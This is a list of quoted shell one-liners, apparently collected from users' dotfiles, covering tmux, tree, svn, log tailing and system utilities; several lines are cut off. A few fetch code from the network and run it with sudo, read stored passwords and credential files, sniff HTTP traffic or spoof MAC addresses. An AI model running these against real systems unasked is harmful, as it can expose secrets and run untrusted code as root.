"uptime | sed -e ""s/.*load average: \(.*\...\), \(.*\...\), \(.*\...\)/\1/"" -e ""s/ //g"""
"uptime | sed 's/.*up \(.*\),.*user.*/\1/'"
"upower -i `upower -e | grep ""BAT""`"
"upower -i /org/freedesktop/UPower/devices/battery_BAT0|grep -E ""percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -e ""time to full:"" -e ""time to empty:"" -e ""percentage:"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""time\ to\ """
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep --color=never percentage;
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep ""time to"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep ""percentage:"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep ""percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 && echo ""---"" && acpi -V | grep --color=never ^Battery"
"upower -i /org/freedesktop/UPower/devices/DisplayDevice | sed -n 12,12p"
"upower -i ""$(upower -e | grep BAT)"""
"upower -d|grep ""time to empty"""
"upower -d | grep ""percentage"""
"updatedb && locate --existing --regex ""\.pac(new|save)$""
"updatedb && locate --existing --regex ""\.pac(new|save)$"
"unzip -p some.docx word/document.xml | sed -e 's/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g'"
"unzip -o ""*.zip"" | rmf *.zip"
"until killall node | grep -m 1 ""No matching processes belonging to you were found""; do sleep 1 ; done"
"unbuffer todoist list --filter ""today & @Linux"" | less -R"
"unbuffer todoist --color --indent list --filter ""today & @Linux"" | less -R"
"unbuffer lsyncd ~/.lsyncd | sed -u ""s/Normal:.*finished/${BLACK} ${BG_GREEN}&${NC}/i"""
"unbuffer git status | sed -e ""s/use \""git restore --staged/use \""git reset HEAD/"" -e ""s/use \""git restore/use \""git checkout --/"""
"uname -r | sed ""s/\(.*\)-\([^0-9]\+\)/\1/"""
"uname -r | cut -d ""."" -f 6"
"uname -r | awk -F ""-"" ""{print \$1\""-\""\$2}"""
"uname -a | cut -d"" "" -f1,3,13-15"
"uname -a | cut -d "" "" -f1,3,13,15"
"typeset -F | sed -e s/""declare -f ""//"
"typeset -F | grep -C 10 -i ""$@"""
"twirl=("":|"" "":/"" "":-"" "":\\""); echo; while ((1)); do for ((i = 0; i < ${#twirl[@]}; i++)); do echo -ne ""\r ${twirl[$i]} ""; sleep .1; done; done"
"tvservice -o > /dev/null && echo ""standby 0"" | cec-client -s > /dev/null && echo ""TV/HDMI OFF"""
"tuns|perl -anle ""kill TERM => \$F[1]"""
"tty | sed -e ""s/.*tty\(.*\)/\1/"""
"trrr ""{letters}"" ""{paren}"" | trrr ""{numbers}"" ""{paren_n}"""
"trimtrim | cut -d"" """
"tree | sed ""s/├/\+/g; s/─/-/g; s/└/\\\/g;"""
"tree /usr/lib/x86_64-linux-gnu/zsh/*/zsh|sed ""s/.so$//"""
"tree -shFa --du --dirsfirst --noreport -I "".git|node_modules"""
"tree -l -I ""*.pyc|__init__.py"""
"tree -h -I ""node_modules*|bower_components*"""
"tree -apsh -I ""node_modules|.git"""
"tree -a -I ""\.git|node_modules"""
"tree -a -I "".git|node_modules"""
"tree -a -I "".git|.svn"""
"tree -a --dirsfirst -I "".git|node_modules"""
"tree -P ""*.c|*.h"" --prune"
"tree -L 1 -I ""*.pyc|__pycache__"""
"tree -I 'CVS|*~'"""
"tree -I ""node_modules|vendor"" -d -L 4"
"tree -I ""node_modules|vendor"" -d -L 3"
"tree -I ""node_modules|vendor"" -d -L 2"
"tree -I ""node_modules|vendor"" -d -L 1"
"tree -I ""node_modules|bundle"""
"tree -I ""node_modules|bower_components"""
"tree -I ""node_modules|.git"""
"tree -I ""node_modules|.git"" -d"
"tree -I ""node_modules*|.git*"" -a -h -C --dirsfirst"
"tree -I ""__pycache__|*.pyc"""
"tree -I ""__pycache__|*.pyc"" --dirsfirst -v"
"tree -I "".git|node_modules"" -aC"
"tree -I ""*.pyc|node_modules"" --matchdirs"
"tree -I ""*.pyc|__pycache__"""
"tree -I ""$(paste -d\| -s ~/.treeignore)"""
"tree -CsAF ""$@"" | less -R"
"tree -CFDshx --dirsfirst --timefmt ""%d/%m/%Y %H:%M"" --filelimit 200 -I ""node_modules|.git"""
"tree -C -a -L 4 -I ""node_modules|.git"""
"tree -C -a -L 3 -I ""node_modules|.git"""
"tree -C -a -L 2 -I ""node_modules|.git"""
"tree -C -a -L 1 -I ""node_modules|.git"""
"tree -C -I ""__pycache__|*.pyc"""
"tree -C ""$@"" | less -R"
"tree -A -I 'CVS|*~'"""
"tree --du -ahC -I "".git|node_modules"" --dirsfirst"
"tree --dirsfirst -N -C -I ""__*|.git"""
"tree --dirsfirst -I "".git|node_modules"""
"tree --dirsfirst -ChFLa 3 -I "".git*|tags"""
"tree --dirsfirst -ChFLa 2 -I "".git*|tags"""
"tree --dirsfirst -ChFLa 1 -I "".git*|tags"""
"trash $(find . -maxdepth 1 -type d | grep -v ""^\.$"")"
"traceroute `echo $SSH_CLIENT | cut -f 1 -d "" ""`"
"trace | grep -e ""IU done"" -e ""connection"""
"tr -s ""[:blank:]"" "" "" | cut -d "" "" -f"
"tr -s "" "" | cut -d "" "" -f 2-"
"tr -s "" "" | cut -d "" "" -f $1"
"tr -dc '01' < /dev/urandom | trim ; \
"tr -dc ""[:lower:][:digit:]"" < /dev/urandom | head -c 16 && echo"
"tr -d \""\\n\""|xclip -selection clipboard"
"tr -d ""\n\r"" < gts.phtml | grep -Po "
"tr -d ""\n"" | xsel -ib"
"tr -d ""\n"" | xsel --clipboard --input"
"tr -d ""\n"" | xclip -selection clipboard"
"tr -d ""\n"" | xclip -selection c"
"tr -d ""\n"" | xclip "
"tr -d ""\n"" | pbcopy; echo ""$(p)"""
"tr -d ""\n"" | pbcopy"
"tr -d ""\\n"" | grep -Po ""\w+(-[\w\d]+)?"""
"tr -d "" \t\n\r"" | sponge"
"tr -cd ""[:graph:]"" < /dev/urandom | head -c 40;echo """""
"tr --delete ""\n"" | xclip -sel clip"
"tr '\n' ',' | sed 's/,$/\n/'"
"tr '\n' ' ' | sed 's/,$/\n/'"
"tr ""\n"" ""\0"" | xargs -0"
"tr ""\n"" ""\0"" | xargs -0 printf ""%q\n"""
"tr ""\n"" ""\0"" | xargs -0 -n1 -I{}"
"tr "","" ""|"""
"tput setaf 5 && printf ""\n%80s\n\n"" | tr "" "" = && tput sgr 0"
"tput cup $(($(stty size|cut -d "" "" -f 1))) 0 && tput ed"
"toybox ps -A -o user,pid,ppid,args | grep -v '\['"
"touch DIFF; rm DIFF; ln -s ~/DIFF .; cvs diff -c > ~/DIFF/diff`date +%y%m%d%H%M-``(pwd | sed ""s/.*\///g"")`"".txt"""
"top -n 1 | grep ""Mem"""
"top -n 1 | grep ""Cpu"""
"top -bn1 | grep -v ""\[.*\]$"""
"tools/test.py -J `git show --name-only --pretty="""" | grep "
"token us | copy && date +""%T"""
"token test | copy && date +""%T"""
"token eu | copy && date +""%T"""
"todos-by-person | grep ""Egg """
"todoist list --filter ""overdue | today"""
"todoist list --filter ""(overdue | today)"""
"todoist --color l --f ""(overdue|today)"""
"todo -c --force-colour --filter -done,+children | less -r"
"tmux-pane-rename ""$(basename $PWD)""; cat | while read line; do tmp3-dl ""$line""; echo ""Finished.""; sleep 5s; done;"
"tmux-pane-rename ""$(basename $PWD)""; cat | while read line; do mp3-dl ""$line""; echo ""Finished.""; sleep 5s; done;"
"tmux switch -t ""`tmux list-sessions | cut -d"
"tmux show-buffer | xclip -i -se p,c"
"tmux show-buffer | cb && alert ""$(tmux show-buffer)"""
"tmux set-buffer ""$( pwd | perl -pe chomp )"""
"tmux rename-session `basename $PWD | sed -e ""s/\./-/g""`"
"tmux new-session -t $(tmux list-sessions -F ""#S""|head -1)"
"tmux new-session -As `basename $PWD | sed -e ""s/\./-/g""`"
"tmux new-session -As $(basename ""$PWD"" | tr . -)"
"tmux new-session -As ""$(basename ""$PWD"" | tr . -)"""
"tmux new -s `basename $PWD | tr ""."" ""-""`"
"tmux new -s `basename $PWD | tr "" "" ""_""`"
"tmux new -s $(echo $(basename $(pwd))|tr ""."" ""_"")"
"tmux new -s $(basename $(pwd) | sed ""s/^\.*//"")"
"tmux new -s $(basename $(pwd) | cut -d""."" -f1)"
"tmux new -s $(basename $(pwd) | awk ""{ gsub(/\./, \""_\"", \$0); print \$0 }"")"
"tmux new -s ""$(basename `pwd` | sed "
"tmux new -s ""$(basename $(pwd) | sed ""s/^[./]//"")"""
"tmux new -A -s ""$(git root | grep -Eo ""[a-zA-Z0-9_ ]+[/][-a-zA-Z0-9_ ]+$"")"""
"tmux ls -F ""#{session_name}"" | while read -r line; do if [[ $line =~ ^-?[0-9]+$ ]]; then tmux kill-session -t $line; fi; done"
"tmux list-windows|sed ""s/^.*\[layout \(.*\)\] @.*$/\1/"""
"tmux list-sessions | egrep -c ""^"""
"tmux list-keys | rg -i"""
"tmux attach-session -t $(tmux list-session -F ""#{session_name}"" | fzf)"
"tmux attach -t ""$(tmux ls -F ""#S"" | fzf --layout=reverse)"""
"tmux a -t $(tmux ls -F ""#{session_name}"" | fzf)"
"tmux a -t $(tmux ls -F ""#S"" | peco)"
"tmux -u new -s `basename $PWD | tr ""."" ""-""`"
"tmux -f ~/.tmux.conf new-session -As $(basename $PWD | sed ""sJ[^[:alnum:]]J_Jg"")"
"tmux -S ""/tmp/.tmux.$DOTFILES_USER.socket"" ls 2>&1 | grep -v ""failed to connect to server"""
"tmux -2 new -s $(basename $(pwd) | tr ""."" -)"
"tmpvar=$( ls -d */ -tr | tail -1) && cd ""$tmpvar"""
"tmpfun() { echo -e ""0\nscale = 4\n$@"" | bc -lq; }; tmpfun $@"
"tmpfun() { echo ""obase=16; ibase=2; $@"" | bc; }; tmpfun $@"
"tmpfun() { echo ""obase=16; ibase=10; $@"" | bc; }; tmpfun $@"
"tmpfun() { echo ""ibase=10; obase=2; $@"" | bc; }; tmpfun $@"
"tmp_f(){ URL_PARAM=$(echo ""$@"" | sed ""s/ /-/g""); lynx -accept_all_cookies https://devhints.io/""$URL_PARAM""; unset -f tmp_f; }; tmp_f"
"tmp_f() { URL_PARAM=$(echo ""$@"" | sed ""s/ /-/g""); lynx -accept_all_cookies https://devhints.io/""$URL_PARAM""; unset -f tmp_f; }; tmp_f"
"tmp_f() { URL_PARAM=$(echo ""$@"" | sed ""s/ /+/g""); lynx -accept_all_cookies https://duckduckgo.com/lite/?q=""$URL_PARAM""; unset -f tmp_f; }; tmp_f"
"tmate -S /tmp/tmate.sock display -p ""#{tmate_ssh}"" | xclip -selection clipboard"
"tlog | egrep '^Rendered.*\d{3,}'"
"timedatectl | grep ""Local"""
"time make 2>&1 | tee make.out; printf ""\nExit status: $?\n"""
"time echo ""scale=5000; a(1)*4"" | bc -l"
"time echo ""scale=5000; 4*a(1)"" | bc -l -q"
"time ( echo ""drop database muscovado_test; create database muscovado_test;"" | ../devtools/db && paster setup-app test.ini )"
"tig $(git branch | sed -e ""s/[\*\ ]//g"")"
"textfiles | xargs sed -i '' 's/
"test -e package.json && jq --color-output ""{ name: .name, scripts: .scripts }"" package.json | less -RXE"
"test -e package.json && jq --color-output ""{ name: .name, devDependencies: .devDependencies, dependencies: .dependencies }"" package.json | less -RXE"
"telnet bofh.jeffballard.us 666 2&> /dev/null | grep ""^Your excuse is:"""
"tello(){ a=`gip $1 $2 | sed ""s/^.* //""`; ssh -i secrets/aws_provisioning.pem ""ubuntu@${a}""; }; tello"
"tee >(perl -pe ""chomp if eof"" | xclip -i -selection clipboard)"
"tee $tmplog;cat $tmplog | mail -s ""Job done"" ""morphit2k@googlemail.com"";rm $tmplog"
"td ls ""+productivity\|+pierdoly"""
"tcpdump -ni $1 -c100 | sed 's/^.*\([ ][0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\).*[>]\([ ][0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\).*$/\1 \2/g'"
"tcpdump -i eth0 -nn -s 1500 -l -w - ""dst port 80 and dst host ${IP}"" | tcpflow -c -r -"
"tcpdump -i en4 -s 0 -l -w - ""dst host 10.0.64.7 and port 80"" | strings"
"tbcomponent ls | grep -vP ""^ +${TBRICKS_SYSTEM%_sys}.*"""
"task summary | sort -r -k 4,4"
"tar cvz ""$1"" | ssh root@192.168.1.99 -C ""tar cvz -C \""$2\"""""
"tar -cf - $@ | xz --memlimit-compress=45% -T 0 -9 -c > ""output.tar.xz"""
"tail /root/easyegais2/log/$(echo ""$(ls /root/easyegais2/log -t | grep -m1 "
"tail -n99 /etc/*{release,version} 2>/dev/null | cat -s"
"tail -n0 -f debug.log | while read line; do notify-send ""WordPress Debug"" ""$line""; done"
"tail -n0 -f /var/log/{{auth,mail}.log,syslog} | grcat conf.log"
"tail -n 2000 -f ~/tomcat/logs/*catalina.out | grep ""\[ERROR\]"" -A 8 "
"tail -n 2000 -f ${ZETA_DIR}/cargo/configurations/*/logs/* | grep ""\[ERROR\]"" -A 8 "
"tail -n +2 /usr/share/exploitdb/files_exploits.csv | awk -F ',' '{print \$2 \"
"tail -f ~/dev61/var/log/debesys/cme.log | sed -u ""s/\x01/ /g"""
"tail -f ~/Library/Preferences/Macromedia/Flash\ Player/Logs/flashlog.txt | grep ""#"""
"tail -f ~/.api_err.log | sed 's/\\\n/\\
"tail -f log/development.log | grep ""##"""
"tail -f /var/log/stumble/{debug,error}.log|grep arvind"
"tail -f /var/log/squid/access.log | perl -pe ""s/^\d+\.\d+/localtime $&/e"""
"tail -f /var/log/debesys/cme.log | sed -u ""s/\x01/ /g"""
"tail -f /var/log/apache2/error.log | cut -d "" "" -f 4,10-"
"tail -f /home/y/logs/yjava_jetty/access | readlog -f date,method,duration,status,url"
"tail -f /home/y/logs/yapache/access | readlog -f date,method,duration,status,url"
"tail -f -n 200 ~/malbekWork/bkgSpectrumPrediction/predictionByContaminant/logFiles/malbekPredictionContaminants.out | grep "" component"""
"tail -f ""`ls -t | head -1`"""
"tail -Fs 10 --pid=""$(pidof weechat)"" ""${HOME}/.weechat/pipe"" | dzen2 -sa c -w 2175 -dock -fn ""xft:FuraCode Nerd Font-Light:pixelsize=20"""
"tail -F /var/log/{messages,syslog,**/*.log}|ccze"
"tail -F /Applications/MAMP/logs/php_error.log |while read -r line;do printf ""\033[38;5;%dm%s\033[0m\n"" $(($RANDOM%255)) ""$line"";done"
"tail -F /Applications/MAMP/logs/mysql_error_log.err |while read -r line;do printf ""\033[38;5;%dm%s\033[0m\n"" $(($RANDOM%255)) ""$line"";done"
"tail -F /Applications/MAMP/logs/apache_error.log |while read -r line;do printf ""\033[38;5;%dm%s\033[0m\n"" $(($RANDOM%255)) ""$line"";done"
"t | grep ""^WARN"""
"t | grep ""^ERROR"""
"t stream timeline -l -d -c | cut -d , -f 1,3,4"
"t notes; vi -c ""packadd vimwiki | normal "
"t lsa | grep `date ""+%Y-%m-%d"" --date=""yesterday""`"
"systemd-analyze blame|cat;echo;systemd-analyze;echo -e ""\n\n"";uptime -p"
"systemctl -l status minidlna.service;ps -e |sed -n ""/tomb/p;/mpd/p;/java/p;/mini/p"""
"system_profiler SPUSBDataType | sed -n -e '/iPad/,/Serial/p' -e '/iPhone/,/Serial/p'"
"system_profiler SPUSBDataType | sed -n -e ""/iPad/,/Extra/p"" -e ""/iPhone/,/Extra/p"""
"system_profiler SPPowerDataType | grep ""Cycle Count"""
"syslog |grep -i ""Wake reason"""
"sysctl hw.ncpu | awk ""{ print $2 }"""
"sysctl hw.acpi.thermal | egrep ""tz.*\.temperature"""
"sxiv ""$(find /HDD/git/xkcd/archive -type f| shuf -n 1)"""
"svnperl | xargs perlcritic -p ~/.perlcriticrc.local --statistics --verbose ""%f:%l:%c:[%p] %m\n"""
"svn up | grep ""^[^U]"""
"svn status | grep -v ""^?"""
"svn status | grep -P '^(?=.{0,6}C)'"
"svn status | grep -P '^(?=.{0,6}A)'"
"svn status | grep -E ""^[ADM]"""
"svn status | grep ""^[^?]"""
"svn status | egrep -v ""^\?"""
"svn status | awk ""/^?/{print $2}"""
"svn status -u | grep -v ""^\?"""
"svn status -q | sed ""s/^\w\s*//"";"
"svn status --show-updates | grep ""^[^?]"""
"svn status --no-ignore |
"svn stat | grep ""^C"""
"svn stat | grep """
"svn stat --ignore-externals | grep -v ""?"""
"svn st | grep -v ""^?"""
"svn st | grep -v ""^$"""
"svn st | grep ""^[^\?]"""
"svn st | grep ""^[^?]"""
"svn st | grep ""^[A,M,?,\!] *"""
"svn st | grep ""^M"""
"svn st | grep ""^C"""
"svn st | grep ""M """
"svn st | grep ""C """
"svn st | grep ""A """
"svn st | egrep ""^C"""
"svn st | \
"svn st --ignore-externals | grep -v ""^X"""
"svn st --ignore-externals | grep ""^?"""
"svn rm $( svn status | sed -e ""/^!/!d"" -e ""s/^!//"" )"
"svn revert . -R && svn status | rm -rf $(awk -f <(echo ""/^?/{print \$2}"") <(svn status) ;)"
"svn revert . -R && svn status | rm -rf $(awk -f <(echo ""/^?/{print \$2"") <(svn status) ;)"
"svn log | sed -n '/marek/,/-----$/ p'"
"svn log -v | sed -n '/ddespain/,/-----$/ p' > ~/myCommits; vim ~/myCommits"
"svn log -l 100 | sed -n '/akoidan/,/-----$/ p'"
"svn info | sed -n ""/URL:/s/.*\///p"""
"svn info | grep ""Revision""; svn update"
"svn editors . | sed ""s/[ ].*//"""
"svn diff ""$@"" |vim -R -"
"svn diff ""$@"" | vless"
"svn diff ""$1"" | colordiff"
"svn diff ""$*"" | colordiff"
"svn --ignore-externals status | egrep -v ""^X"""
"svn --diff-cmd diff -x ""-y --suppress-common-lines"" diff | less"
"surf -x -t hgmd.css | read HDSURFXID & (while read; do hoedown CHANGELOG.md > changelog.html; echo xprop -id $HDSURFXID -f _SURF_GO 8s -set _SURF_GO ""file://$(pwd)/changelog.html"" ; done; rm changelog.html)"
"sudo zsh ; PROMPT=""%{$fg[cyan]%}+-----------------------------------+ | %{$fg[red]%}%n $ %{$fg[yellow]%}"""""
"sudo watch -n 5 ""docker ps -n15 --format \""table {{.RunningFor}}\\t{{.Status}}\\t{{.Command}}\\t{{.Names}}\"" | cut -c -140"""
"sudo watch -n 1 ""netstat -tpanl | grep ESTABLISHED"""
"sudo updatedb;mpv ""$(locate /home/den/01/2watch/0_0 | fzf)"""
"sudo updatedb;mpv ""$(locate /home/den/01/1.Audio/2listen | fzf)"""
"sudo updatedb && locate --existing --regex ""\.pac(new|save)$"""
"sudo umount `mount|grep -o ""/var/lib/docker/aufs/mnt/[a-z0-9]*""`"
"sudo umount /mnt/tsp* |
"sudo tlp-stat | grep ""+++ TLP Status"" -A 4"
"sudo tlp-stat -b -s | grep ""Mode"""
"sudo tcpflow -iwlan0 -b 200 -c ""host 74.125.71.138 or host www.google.com"" | tee /tmp/tcpflow.log"
"sudo tcpdump -l -s 1460 -x ""port 80"" | tcpdump-filter.pl"
"sudo tcpdump -i en1 -n -s 0 -w - | grep -a -o -E ""Host\:"""
"sudo tail -f /var/log/{messages,maillog} -n 25 | ccze -A"
"sudo tail -f /var/log/messages.log | grep ""localhost Tor"""
"sudo tail -f /home/y/logs/yapache/access | readlog -f url,status"
"sudo systemctl list-unit-files|grep enabled
"sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches > /dev/null && echo -ne ""\033[32mCache purged.\n\007"""
"sudo svmon -P -O sortseg=pgsp,unit=MB|head -30"
"sudo smartctl -a /dev/sdb | grep -A2 ""233"""
"sudo smartctl -A /dev/sda |
"sudo sh -c ""pacman -Qtdq | xargs -r pacman --noconfirm -Rns && pacman -Sc"""
"sudo sh -c ""pacman -Qdtq | pacman -Rs -"""
"sudo sh -c ""grub2-mkconfig | tee /etc/grub*.cfg >/dev/null"""
"sudo sed -i ""2,$ d; s/^.*$/$(pgrep x11vnc | paste -s -d "
"sudo security find-generic-password -ga ""MOTOE04A"" | grep ""password:"""
"sudo resethosts; sudo curl ""https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts"" | sudo tee -a /etc/hosts"
"sudo ps -o pid,ppid,comm | grep"
"sudo prt-get listorphans | grep -v ""$(cat ~/script/listorphans)"""
"sudo prt-get listinst | grep -v ""$(cat ~/script/listinst)"""
"sudo pip install -U $(pip list --format=legacy | cut -d "" "" -f1)"
"sudo pip install --upgrade $(yolk -U | cut -d"" "" -f 2)"
"sudo pacman -Qqe | grep -v ""$(pacman -Qmq)"" > ~/Dropbox/Archer/pklist.txt"
"sudo pacman -Qqe | grep -v ""$(pacman -Qmq)"" > /mnt/media/backups/pkglist"
"sudo pacman -Qqe | grep -v ""$(pacman -Qmq)"" > /mnt/media/backups/pkglist "
"sudo pacman -Qii | sed -nE ""s/^MODIFIED\s*(.*)/\1/p"""
"sudo nvram boot-args=""serverperfmode=1 $(nvram boot-args 2>/dev/null | cut -f 2-)"""
"sudo nmap -sU --script nbstat.nse -p137 10.0.0.1-12 | grep -B 9 ""NetBIOS name: \w\+"""
"sudo nmap -sP 192.168.1.0/24 | awk
"sudo ngrep -d lo -tq -W byline -v ""(^H|^R)"" port 31091"
"sudo ngrep -d en1 -q -W byline ""^(GET|POST) .*"""
"sudo ngrep -d $(gwi) -t ""^(GET|POST) "" ""tcp and port 80"""
"sudo ngrep -d ""eth1"" -t ""^(GET|POST) "" ""tcp and port 80"""
"sudo ngrep -d ""enp6s0"" -t ""^(GET|POST) "" ""tcp and port 80"""
"sudo ngrep -d ""en0"" -t ""^(GET|POST) "" ""tcp and port 80"""
"sudo netstat -tulpen | sed -E ""s/\s+/ /g"""
"sudo netstat -ap tcp | grep -i ""listen"""
"sudo lsof |grep ""\(deleted\)"""
"sudo lsof | grep ""(deleted)$"""
"sudo lsof -nP -i4 -iudp -itcp -stcp:listen | grep -v ""\:\*"""
"sudo lsof -i -nP | grep ""(LISTEN)"""
"sudo lsof -i -n | egrep ""\<ssh\>"""
"sudo lsof -i -P|grep -i ""listen"""
"sudo lsof -i -P | grep -i ""listen"""
"sudo lsof -i -P | grep ""LISTEN"""
"sudo ls -l | grep ""^d"""
"sudo ls -1 /Library/Application\ Support/JAMF/Waiting\ Room/ | grep -v "".cache.xml"""
"sudo kill -9 $(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')"
"sudo journalctl -fb --no-tail --since ""1 week ago"" | fzf-journal"
"sudo journalctl -fb --no-tail --since ""1 week ago"" -p 4 | fzf-journal"
"sudo iptables -L -nvx | grep -v "" 0 DROP"""
"sudo ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*'
"sudo ifconfig wlan0 ether `openssl rand -hex 6 | sed ""s/\(..\)/\1:/g; s/.$//""`"
"sudo ifconfig eth0 ether `openssl rand -hex 6 | sed ""s/\(..\)/\1:/g; s/.$//""`"
"sudo ifconfig en0 ether `openssl rand -hex 6 | sed ""s/\(..\)/\1:/g;s/.$//""`"
"sudo ifconfig en0 ether `openssl rand -hex 6 | sed ""s/\(..\)/\1:/g; s/.$//""`"
"sudo ifconfig en0 ether $(openssl rand -hex 6 | sed ""s%\(..\)%\1:%g; s%.$%%"")"
"sudo ifconfig en0 ether ""$(openssl rand -hex 6 | sed "
"sudo ifconfig -a | grep -o 'inet6\\?
"sudo ifconfig $(ifconfig -a | grep -o ""en\w*"") up && sudo dhclient"
"sudo grep admin_passwd /etc/odoo/odoo.conf | cut -f 3 -d"" """
"sudo grep -iE ^\(\[0-9\]\{1,3\}\.*\)\{4\}.*\(union\|from\) $LOGDIR_APACHE/access_log"
"sudo gem update `gem list | cut -d "" "" -f 1`; brew update; brew upgrade; brew cask upgrade; brew prune; brew cleanup; brew doctor; composer global update; npm update -g; zmanage update"
"sudo fs_usage -w -f filesys mdworker | grep ""open"""
"sudo fs_usage -f ""filesys"" | grep open"
"sudo find /var/log/httpd/ -iname ""*log"" | xargs sudo tail -f "
"sudo find . -name "".DS_*"" | xargs rm"
"sudo find -L ~/Picture/.forbiddence -type f | sudo xargs -d ""\n"" chmod 000;
"sudo find -L ~/Picture/.forbiddence -type d | sudo xargs -d ""\n"" chmod 700;
"sudo fdisk -l | grep ""Disk /"""
"sudo echo ""ok"" && xlock 2>/dev/null & echo mem | sudo tee /sys/power/state"
"sudo echo ""ok"" && xlock 2>/dev/null & echo disk | sudo tee /sys/power/state"
"sudo echo ""J"" | sudo pacman -Scc && printf ""\n"""
"sudo echo ""Is commit message signed?"" | gpg --clearsign"
"sudo du -h | grep G$""\t"""
"sudo du -h / | grep -E ""[0-9]G"""
"sudo du -h / | grep '[0-9\,]\+G'"
"sudo docker ps --format ""{{.ID}}\t {{.Command}}\t\t {{.RunningFor}}\t\t {{.Names}}"" | grep -v pause"
"sudo dmidecode|grep ""System Information"" -A 8"
"sudo dmidecode | grep -B 1 ""Form Factor: DIMM"" && print MORE WITH: sudo dmidecode -t memory"
"sudo date -s ""$(date --date=""$(curl -sI www.google.com 2>&1 | sed -n -r ""s/Date: (.*)/\1/1p"")"")"""
"sudo chruby-exec `ruby --version | grep ""ruby [^ ]""` --"
"sudo chown -R $USER:$(groups | cut -d "" "" -f1)"
"sudo cat /var/log/syslog |grep ""Permission denied"""
"sudo cat /var/log/syslog | grep ""($(whoami))"""
"sudo cat /var/log/auth.log | grep ""password"""
"sudo cat /dev/null && sudo iptables-save |\
"sudo bash -c ""$(fc -l -1 | cut -d "" "" -f 4-)"""
"sudo arp-scan -l | grep ""\t"""
"sudo arp-scan -l | grep ""CADMUS COMPUTER SYSTEMS"" "
"sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \
"sudo aptitude remove -P ""?and(~i~nlinux-(ima|hea),\
"sudo aptitude remove -P ""?and(~i~nlinux-(ima|hea) ?not(~n`uname -r`))"""
"sudo aptitude remove -P ""?and(~i~nlinux-(ima|hea) ?not(~n$(uname -r)))"""
"sudo apt-get update -y | grep -v \':\' \
"sudo apt-get remove -P ?and(~i~nlinux-(ima|hea) \
"sudo apt remove -P ?and(~i~nlinux-(ima|hea) \
"sudo apachectl restart | echo ""Apache restarted"""
"sudo /usr/sbin/lsof -nP |
"sudo /usr/bin/zsh -c ""$(fc -rnl| head -1)"""
"sudo -v; echo;echo ""--> full update...""; apple_update; brew_update; npm_update; gem_update; echo;echo ""completed update |<--""; refresh"
"sudo -v && wget -nv -O- https://raw.githubusercontent.com/kovidgoyal/calibre/master/setup/linux-installer.py | sudo python2 -c ""import sys; main=lambda:sys.stderr.write("
"sudo -v && wget -nv -O- https://raw.githubusercontent.com/kovidgoyal/calibre/master/setup/linux-installer.py | sudo python -c ""import sys; main=lambda:sys.stderr.write("
"sudo -s -- sh -c ""$(fc -nl | tail -n 1)"""
"sudo -H pip2 install -U $(pip2 freeze | awk '{split($0, a, "
"sudo $(history -1 |cut -d"" "" -f4-)"
"subl `git status --porcelain | sed -ne ""s/^UU //p""`"
"subl `git status --porcelain | sed -ne ""s/^ M //p""`"
"su -lc ""aptitude remove -P ?and(~i~nlinux-(ima|hea) ?not(~n$(uname -r)))"" root"
"su -c ""zcat /proc/config.gz | grep CONFIG_ATH"""
"stty \$(stty -a | sed -ne '
"streamlink --player=""cvlc --no-video"" ""https://www.youtube.com/freecodecamp/live"" 720p|& tee /dev/null
"strace -ff -p $(pidof sshd) -e read |& grep -F ', \"
"stint | while read -r; do printf ""#%X %X %X\n"" $REPLY; done"
"stat -c %n,%z,%F err.txt generated.file succ.txt | python tidy_folder.py"
"stat -c %a\ %N\ %G\ %U ""$@"" | sort"
"stat -c ""%a %A %G:%U %n"" ./err.txt ./generated.file ./succ.txt | column -t"
"stat --printf=""%a %-18F %10s %N\n"" .*|sort -k2"
"stat --printf=""%a %-18F %10s %N\n"" *|sort -k2"
"startx -- vt$(tty | sed -e ""s:/dev/tty::"")"
"startx -- :1 vt$(tty | sed -e ""s:/dev/tty::"")"
"start `find . -maxdepth 2 -type f -name ""*.sln"" | head -n 1`"
"stack-overflow-no-copy | pbcopy; pbpaste; echo -e ""\n\nCopied to pastebuffer (use stack-overflow-no-copy to avoid this)!"""
"st | xargs -ivar svn add ""var"""
"st | grep -E ""^.? {0,7}C"""
"ssu status | awk -F ""[ )]"" /model/"
"sst --ignore-externals | grep ""^[^X]"""
"sshpass -f /root/.sfa ssh -T user@sfa14k1 ""show enc al"" | grep ""Production serial numb"""
"ssh-agent | sed ""s/Agent/ssh-agent/"" > ~/.ssh/agent; source ~/.ssh/agent; ssh-add"
"ssh-add -L |cut -f3 -d "" """
"ssh wherewolf-WORKER0001 ""tail -f /var/log/nginx/wherewolf.log"" | logstalgia --sync --full-hostnames --update-rate 1 -g ""API,URI=.*,100"""
"ssh ubuntu@10.0.0.11 ""echo \""$1\"" | espeak -s 120 2>/dev/null"""
"ssh stakahama@elguapo.ucsd.edu ""ps aux | grep DLPOLY\.X"""
"ssh root@$(VBoxManage guestproperty get ""Kali Linux"" /VirtualBox/GuestInfo/Net/1/V4/IP | cut -d"" "" -f2)"
"ssh perceptron ""cd ~/cdrl/log && /cm/shared/apps/slurm/16.05.2/bin/squeue | grep poweic && ./grep-humanoid.sh 5 && ./grep-double.sh 5 && ./grep-pendulum.sh 5"""
"ssh oldnoc ""sudo grep automation /home/passwords/oldpasswords7"" | awk "
"ssh oldnoc ""sudo grep automation /home/passwords/newpasswords8-now_in_use_now "" | awk "
"ssh mod05 tail -F ""/iad/finn/search-pushnotifier/logs/search-pushnotifier.log | grep --line-buffered monitor"""
